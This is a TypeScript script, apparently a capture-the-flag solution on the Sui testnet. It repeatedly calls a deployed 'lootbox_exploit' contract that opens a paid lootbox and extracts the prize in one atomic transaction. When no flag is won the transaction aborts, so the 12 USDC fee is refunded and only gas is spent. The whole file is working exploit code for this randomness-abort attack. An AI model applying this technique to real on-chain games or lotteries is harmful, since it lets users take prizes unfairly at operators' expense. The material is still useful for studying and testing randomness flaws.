import { SuiJsonRpcClient } from '@mysten/sui/jsonRpc';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import keyPairJson from "../keypair.json" with { type: "json" };

const EXPLOIT_PACKAGE = "0xed5466dfde2928440a9928f0f345df9390bf47a8248494b9c18a73c3c34e174b";
const USDC_PACKAGE = "0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29";
const USDC_TYPE = `${USDC_PACKAGE}::usdc::USDC`;
const REQUIRED_PAYMENT = 12_000_000; // 12 USDC
const RANDOM = "0x8";

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const client = new SuiJsonRpcClient({ network: 'testnet', url: 'https://fullnode.testnet.sui.io:443' });
const myAddress = keypair.getPublicKey().toSuiAddress();

async function tryWin(): Promise<boolean> {
  const { data: coins } = await client.getCoins({ owner: myAddress, coinType: USDC_TYPE });
  const total = coins.reduce((s: number, c: { balance: string }) => s + Number(c.balance), 0);
  console.log(`USDC balance: ${total / 1_000_000} USDC`);

  if (total < REQUIRED_PAYMENT) {
    console.log("Not enough USDC for another attempt. Need 12 USDC.");
    return false;
  }

  const tx = new Transaction();
  const primaryCoin = tx.object(coins[0].coinObjectId);
  if (coins.length > 1) {
    tx.mergeCoins(primaryCoin, coins.slice(1).map((c: { coinObjectId: string }) => tx.object(c.coinObjectId)));
  }
  const [paymentCoin] = tx.splitCoins(primaryCoin, [REQUIRED_PAYMENT]);

  // Exploit: atomically open + extract. If no flag → tx aborts → USDC refunded!
  tx.moveCall({
    target: `${EXPLOIT_PACKAGE}::lootbox_exploit::try_win`,
    arguments: [paymentCoin, tx.object(RANDOM)],
  });

  try {
    const result = await client.signAndExecuteTransaction({
      signer: keypair,
      transaction: tx,
      options: { showEffects: true },
    });
    console.log("FLAG WON! Digest:", result.digest);
    console.log(`View: https://suiscan.xyz/testnet/tx/${result.digest}`);
    return true;
  } catch (e: unknown) {
    const msg = e instanceof Error ? e.message : String(e);
    if (msg.includes('ENoFlag') || msg.includes('abort code: 0') || msg.includes('abort_code: 0')) {
      console.log("No flag this attempt — USDC refunded, only gas spent. Retrying...");
    } else {
      throw e;
    }
    return false;
  }
}

(async () => {
  let attempt = 0;
  while (true) {
    attempt++;
    console.log(`\nAttempt #${attempt}...`);
    const won = await tryWin();
    if (won) break;

    // Check if we still have enough USDC (exploit refunds on miss, so balance stays ~same)
    const { data: coins } = await client.getCoins({ owner: myAddress, coinType: USDC_TYPE });
    const total = coins.reduce((s: number, c: { balance: string }) => s + Number(c.balance), 0);
    if (total < REQUIRED_PAYMENT) {
      console.log("Out of USDC. Add more and run again.");
      break;
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
  }
})();
